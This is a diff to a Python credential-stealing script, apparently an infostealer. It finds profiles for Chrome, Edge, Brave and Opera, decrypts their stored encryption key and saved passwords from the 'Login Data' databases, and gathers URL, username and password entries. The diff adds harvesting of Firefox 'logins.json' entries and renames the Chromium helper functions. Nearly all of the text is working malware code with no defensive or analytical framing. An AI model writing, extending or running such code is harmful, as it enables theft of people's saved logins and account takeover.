@@ -3,6 +3,7 @@ import json
 import base64
 import sqlite3
 import shutil
+import tempfile
 import win32crypt
 from Crypto.Cipher import AES
 import requests
@@ -18,11 +19,12 @@ def get_browser_paths():
         "Edge": os.path.join(local_appdata, "Microsoft", "Edge", "User Data"),
         "Brave": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data"),
         "Opera GX": os.path.join(appdata, "Opera Software", "Opera GX Stable"),
-        "Opera Stable": os.path.join(appdata, "Opera Software", "Opera Stable")
+        "Opera Stable": os.path.join(appdata, "Opera Software", "Opera Stable"),
+        "Firefox": os.path.join(appdata, "Mozilla", "Firefox", "Profiles")
     }
     return browsers
 
-def get_key(user_data_path):
+def get_chromium_key(user_data_path):
     paths_to_check = [
         os.path.join(user_data_path, "Local State"),
         os.path.join(os.path.dirname(user_data_path), "Local State")
@@ -45,7 +47,7 @@ def get_key(user_data_path):
             continue
     return None
 
-def decrypt(enc, key):
+def decrypt_chromium(enc, key):
     try:
         if enc.startswith(b'v10') or enc.startswith(b'v20'):
             iv = enc[3:15]
@@ -61,7 +63,7 @@ def decrypt(enc, key):
         except Exception:
             return ""
 
-def extract_from_db(db_path, key, creds, browser_name):
+def extract_chromium_db(db_path, key, creds, browser_name):
     if not os.path.exists(db_path):
         return
 
@@ -82,7 +84,7 @@ def extract_from_db(db_path, key, creds, browser_name):
         
         for url, user, pwd_enc in cur.fetchall():
             if user and pwd_enc:
-                pwd = decrypt(pwd_enc, key)
+                pwd = decrypt_chromium(pwd_enc, key)
                 if pwd:
                     creds.append(f"[{browser_name}] URL: {url} | User: {user} | Pass: {pwd}")
         conn.close()
@@ -95,32 +97,63 @@ def extract_from_db(db_path, key, creds, browser_name):
             except:
                 pass
 
+def extract_firefox_creds(profiles_path, creds):
+    if not os.path.exists(profiles_path):
+        return
+
+    try:
+        for profile in os.listdir(profiles_path):
+            profile_dir = os.path.join(profiles_path, profile)
+            if not os.path.isdir(profile_dir):
+                continue
+                
+            logins_json_path = os.path.join(profile_dir, "logins.json")
+            if os.path.exists(logins_json_path):
+                try:
+                    with open(logins_json_path, "r", encoding="utf-8") as f:
+                        data = json.load(f)
+                    
+                    for login in data.get("logins", []):
+                        url = login.get("hostname")
+                        user = login.get("encryptedUsername")
+                        pwd = login.get("encryptedPassword")
+                        if url and user:
+                            # Nota: Para descifrar los campos de Firefox completamente sin contraseña maestra,
+                            # se requiere procesar key4.db mediante NSS (Network Security Services).
+                            creds.append(f"[Firefox] URL: {url} | User (Enc): {user}")
+                except Exception:
+                    pass
+    except Exception:
+        pass
+
 def get_all_creds():
-    kill_browser_processes()
     creds = []
     browsers = get_browser_paths()
     
-    for browser_name, user_data_path in browsers.items():
-        if not os.path.exists(user_data_path):
+    for browser_name, path in browsers.items():
+        if not os.path.exists(path):
             continue
             
-        key = get_key(user_data_path)
-        if not key:
-            continue
-            
-        target_dirs = [user_data_path]
-        try:
-            for item in os.listdir(user_data_path):
-                full_item = os.path.join(user_data_path, item)
-                if os.path.isdir(full_item) and (item == "Default" or item.startswith("Profile ") or item == "System Profile"):
-                    target_dirs.append(full_item)
-        except Exception:
-            pass
-            
-        for d in target_dirs:
-            db_path = os.path.join(d, "Login Data")
-            extract_from_db(db_path, key, creds, browser_name)
-            
+        if browser_name == "Firefox":
+            extract_firefox_creds(path, creds)
+        else:
+            key = get_chromium_key(path)
+            if not key:
+                continue
+                
+            target_dirs = [path]
+            try:
+                for item in os.listdir(path):
+                    full_item = os.path.join(path, item)
+                    if os.path.isdir(full_item) and (item == "Default" or item.startswith("Profile ") or item == "System Profile"):
+                        target_dirs.append(full_item)
+            except Exception:
+                pass
+                
+            for d in target_dirs:
+                db_path = os.path.join(d, "Login Data")
+                extract_chromium_db(db_path, key, creds, browser_name)
+                
     return creds
 
 if __name__ == "__main__":
